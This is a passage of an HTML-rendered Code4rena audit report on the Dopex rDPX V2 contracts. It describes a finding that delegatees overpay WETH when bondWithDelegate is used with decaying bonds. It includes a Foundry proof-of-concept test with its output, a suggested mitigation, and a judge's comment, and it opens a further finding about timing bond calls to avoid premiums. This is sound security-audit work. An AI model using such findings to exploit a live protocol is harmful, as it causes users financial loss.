class=\"mtk11\">getRdpxPrice</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_rdpxBondId</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bondDiscount</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">bondDiscountFactor</span><span class=\"mtk1\"> *</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">Math</span><span class=\"mtk1\">.</span><span class=\"mtk11\">sqrt</span><span class=\"mtk1\">(</span><span class=\"mtk11\">IRdpxReserve</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addresses</span><span class=\"mtk1\">.</span><span class=\"mtk12\">rdpxReserve</span><span class=\"mtk1\">).</span><span class=\"mtk11\">rdpxReserve</span><span class=\"mtk1\">()) *</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk7\">1e2</span><span class=\"mtk1\">) / (</span><span class=\"mtk10\">Math</span><span class=\"mtk1\">.</span><span class=\"mtk11\">sqrt</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">)); </span><span class=\"mtk3\">// 1e8 precision</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">_validate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bondDiscount</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk7\">100e8</span><span class=\"mtk1\">, </span><span class=\"mtk7\">14</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">rdpxRequired</span><span class=\"mtk1\"> =</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ((</span><span class=\"mtk12\">RDPX_RATIO_PERCENTAGE</span><span class=\"mtk1\"> - (</span><span class=\"mtk12\">bondDiscount</span><span class=\"mtk1\"> / </span><span class=\"mtk7\">2</span><span class=\"mtk1\">)) *</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\"> *</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk12\">DEFAULT_PRECISION</span><span class=\"mtk1\">) /</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span><span class=\"mtk12\">DEFAULT_PRECISION</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">rdpxPrice</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">wethRequired</span><span class=\"mtk1\"> =</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ((</span><span class=\"mtk12\">ETH_RATIO_PERCENTAGE</span><span class=\"mtk1\"> - (</span><span class=\"mtk12\">bondDiscount</span><span class=\"mtk1\"> / </span><span class=\"mtk7\">2</span><span class=\"mtk1\">)) * </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">) /</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span><span class=\"mtk12\">DEFAULT_PRECISION</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// if rdpx decaying bonds are being used there is no discount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">rdpxRequired</span><span class=\"mtk1\"> =</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span><span class=\"mtk12\">RDPX_RATIO_PERCENTAGE</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">DEFAULT_PRECISION</span><span class=\"mtk1\">) /</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span><span class=\"mtk12\">DEFAULT_PRECISION</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">rdpxPrice</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">&gt;&gt;&gt;   </span><span class=\"mtk12\">wethRequired</span><span class=\"mtk1\"> =</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span><span class=\"mtk12\">ETH_RATIO_PERCENTAGE</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">) /</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span><span class=\"mtk12\">DEFAULT_PRECISION</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">strike</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IPerpetualAtlanticVault</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addresses</span><span class=\"mtk1\">.</span><span class=\"mtk12\">perpetualAtlanticVault</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      .</span><span class=\"mtk11\">roundUp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rdpxPrice</span><span class=\"mtk1\"> - (</span><span class=\"mtk12\">rdpxPrice</span><span class=\"mtk1\"> / </span><span class=\"mtk7\">4</span><span class=\"mtk1\">)); </span><span class=\"mtk3\">// 25% below the current price</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">timeToExpiry</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IPerpetualAtlanticVault</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">addresses</span><span class=\"mtk1\">.</span><span class=\"mtk12\">perpetualAtlanticVault</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ).</span><span class=\"mtk11\">nextFundingPaymentTimestamp</span><span class=\"mtk1\">() - </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">putOptionsRequired</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">&gt;&gt;&gt;   </span><span class=\"mtk12\">wethRequired</span><span class=\"mtk1\"> += </span><span class=\"mtk11\">IPerpetualAtlanticVault</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addresses</span><span class=\"mtk1\">.</span><span class=\"mtk12\">perpetualAtlanticVault</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        .</span><span class=\"mtk11\">calculatePremium</span><span class=\"mtk1\">(</span><span class=\"mtk12\">strike</span><span class=\"mtk1\">, </span><span class=\"mtk12\">rdpxRequired</span><span class=\"mtk1\">, </span><span class=\"mtk12\">timeToExpiry</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n</details>\n<p>This means, delegatee need to paid undiscounted <code>wethRequired</code> plus undiscounted premium!</p>\n<p>This will make delegatee would not want to fulfill <code>bondWithDelegate</code> when decaying bond is used. Delegatee can front-run by withdrawing his delegated assets before <code>bondWithDelegate</code>  with using decaying bonds calls.</p>\n<p>PoC Foundry :</p>\n<p>Comparing fulfilling <code>bondWithDelegate</code> requests in 2 scenarios, with decaying bonds and non-decaying bonds.</p>\n<p>Add this test to <code>Unit</code> contract inside <code>/tests/rdpxV2-core/Unit.t.sol</code>, also add <code>import \"forge-std/console.sol\";</code> in the contract :</p>\n<details>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"65\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testBondWithDelegateCompare</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">alice</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">makeAddr</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;alice&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">rdpx</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">alice</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1000</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// test with rdpx decaying bonds</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">rdpxDecayingBonds</span><span class=\"mtk1\">.</span><span class=\"mtk11\">grantRole</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">rdpxDecayingBonds</span><span class=\"mtk1\">.</span><span class=\"mtk11\">MINTER_ROLE</span><span class=\"mtk1\">(),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">rdpxDecayingBonds</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">alice</span><span class=\"mtk1\">, </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">10</span><span class=\"mtk1\">, </span><span class=\"mtk7\">125</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e16</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rdpxDecayingBonds</span><span class=\"mtk1\">.</span><span class=\"mtk11\">ownerOf</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">), </span><span class=\"mtk12\">alice</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">/// add to delegate with different fees</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">delegateId</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">rdpxV2Core</span><span class=\"mtk1\">.</span><span class=\"mtk11\">addToDelegate</span><span class=\"mtk1\">(</span><span class=\"mtk7\">50</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">, </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e8</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// uint256 delgateId2 = rdpxV2Core.addToDelegate(10 * 1e18, 20 * 1e8);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// test bond with delegate</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_amounts</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_delegateIds</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">_delegateIds</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">_amounts</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// address 1 bonds</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">/// check user balance</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">userRdpxBalance</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">rdpx</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">alice</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">userWethBalance</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">weth</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">alice</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rdpxRequired</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">wethRequired</span><span class=\"mtk1\">) = </span><span class=\"mtk12\">rdpxV2Core</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            .</span><span class=\"mtk11\">calculateBondCost</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">alice</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">rdpx</span><span class=\"mtk1\">.</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rdpxV2Core</span><span class=\"mtk1\">), </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">userAmount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">delegateAmounts</span><span class=\"mtk1\">) = </span><span class=\"mtk12\">rdpxV2Core</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            .</span><span class=\"mtk11\">bondWithDelegate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">alice</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_amounts</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_delegateIds</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;weth paid without decaying bond&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk12\">wethRequired</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;delegatee received amount without decaying bond&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk12\">delegateAmounts</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">alice</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">rdpx</span><span class=\"mtk1\">.</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rdpxV2Core</span><span class=\"mtk1\">), </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// with decaying bond</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rdpxRequired2</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">wethRequired2</span><span class=\"mtk1\">) = </span><span class=\"mtk12\">rdpxV2Core</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            .</span><span class=\"mtk11\">calculateBondCost</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">userAmount2</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">delegateAmounts2</span><span class=\"mtk1\">) = </span><span class=\"mtk12\">rdpxV2Core</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            .</span><span class=\"mtk11\">bondWithDelegate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">alice</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_amounts</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_delegateIds</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;weth paid with decaying bond&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk12\">wethRequired2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;delegatee received amount with decaying bond&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk12\">delegateAmounts2</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n</details>\n<p>Run the test :</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"66\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">forge test --match-contract Unit --match-test testBondWithDelegateCompare -vvv</span></span></code></pre>\n<p>Test Output :</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"67\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">Logs:</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  weth paid without decaying bond</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  806250000000000000</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  delegatee received amount without decaying bond</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  197562425683709869</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  weth paid with decaying bond</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  812500000000000000</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  delegatee received amount with decaying bond</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  197058823529411765</span></span></code></pre>\n<p>It can be observed delegatee paid weth more with decaying bond and receive less bond share.</p>\n<h3 id=\"recommended-mitigation-steps-18\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-18\" aria-label=\"recommended mitigation steps 18 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Consider to restrict <code>bondWithDelegate</code> for only non-decaying bonds. Or also add discount but apply only to the weth part if called from <code>bondWithDelegate</code>.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/780#issuecomment-1772393892\">Alex the Entreprenerd (Judge) commented</a>:</strong></p>\n<blockquote>\n<p>Incur Loss == Mispriced</p>\n</blockquote>\n<p> Making primary because this warden sent the POC before any request.</p>\n<hr>\n<h2 id=\"m-12-user-can-avoid-paying-high-premium-price-by-correctly-timing-his-bond-call\" style=\"position:relative;\"><a href=\"#m-12-user-can-avoid-paying-high-premium-price-by-correctly-timing-his-bond-call\" aria-label=\"m 12 user can avoid paying high premium price by correctly timing his bond call permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 